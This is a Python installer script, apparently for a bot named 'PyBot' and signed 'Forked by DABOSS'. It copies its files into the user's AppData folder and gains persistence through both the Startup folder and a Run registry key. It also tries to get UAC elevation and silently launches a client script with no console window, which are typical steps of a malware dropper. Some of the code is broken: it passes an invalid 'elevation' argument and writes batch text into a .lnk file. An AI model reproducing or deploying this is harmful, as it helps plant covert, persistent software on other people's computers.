import os
import shutil
import subprocess
import sys

# Get the AppData folder path
appdata_folder = os.getenv('APPDATA')

# Copy start.py and Client2.0.py to AppData folder if they don't already exist
src_files = ["start.py", "Client2.0.py"]
for src_file in src_files:
    src_path = os.path.abspath(src_file)
    dst_path = os.path.join(appdata_folder, src_file)
    if not os.path.exists(dst_path):
        shutil.copy(src_path, dst_path)
        print(f"Successfully copied {src_file} to {appdata_folder}")
    else:
        print(f"{src_file} already exists in {appdata_folder}")

# Add start.py to the Windows startup folder if it's not already there
startup_folder = os.path.join(appdata_folder, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
startup_path = os.path.join(startup_folder, "PyBot.lnk")
if not os.path.exists(startup_path):
    with open(startup_path, 'w') as shortcut:
        shortcut.write('@echo off\n')
        shortcut.write(f'start "" "{os.path.join(appdata_folder, "start.py")}"')
    print("Added start.py to startup")
else:
    print("start.py already in startup")

# Check if the registry key exists
reg_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
try:
    import winreg
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key) as key:
        val = winreg.QueryValueEx(key, "PyBot")
        if val[0] == os.path.join(appdata_folder, "start.py"):
            print("PyBot already exists in registry")
        else:
            raise Exception("Registry key exists but doesn't match start.py path")
except WindowsError:
    # Create the registry key if it doesn't exist
    print("PyBot not in registry")
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_key) as key:
        winreg.SetValueEx(key, "PyBot", 0, winreg.REG_SZ, os.path.join(appdata_folder, "start.py"))
    print("Added PyBot to registry")

    # Ask for UAC elevation
    if sys.argv[-1] != '-uac':
        script = os.path.abspath(__file__)
        params = ' '.join([script] + sys.argv[1:] + ['-uac'])
        subprocess.run(params, shell=True, elevation=True)

# Run Client2.0.py from the AppData folder without displaying a console window
client_path = os.path.join(appdata_folder, "Client2.0.py")
if os.path.exists(client_path):
    subprocess.Popen(["pythonw.exe", client_path], cwd=appdata_folder)
else:
    print("Client2.0.py not found in AppData folder")

# ASCII art
print("\n\n")
#__/\\\\\\\\\\\\\__________________/\\\\\\\\\\\\\_______________________________        
#"_\/\\\/////////\\\_______________\/\\\/////////\\\_____________________________       
#" _\/\\\_______\/\\\____/\\\__/\\\_\/\\\_______\/\\\___________________/\\\______      
#" _\/\\\\\\\\\\\\\/____\//\\\/\\\__\/\\\\\\\\\\\\\\______/\\\\\_____/\\\\\\\\\\\_     
#"   _\/\\\/////////_______\//\\\\\___\/\\\/////////\\\___/\\\///\\\__\////\\\////__    
#"    _\/\\\_________________\//\\\____\/\\\_______\/\\\__/\\\__\//\\\____\/\\\______   
#"     _\/\\\______________/\\_/\\\_____\/\\\_______\/\\\_\//\\\__/\\\_____\/\\\_/\\__  
#"      _\/\\\_____________\//\\\\/______\/\\\\\\\\\\\\\/___\///\\\\\/______\//\\\\\___ 
#"       _\///_______________\////________\/////////////_______\/////_________\/////____
#print          Forked by DABOSS           
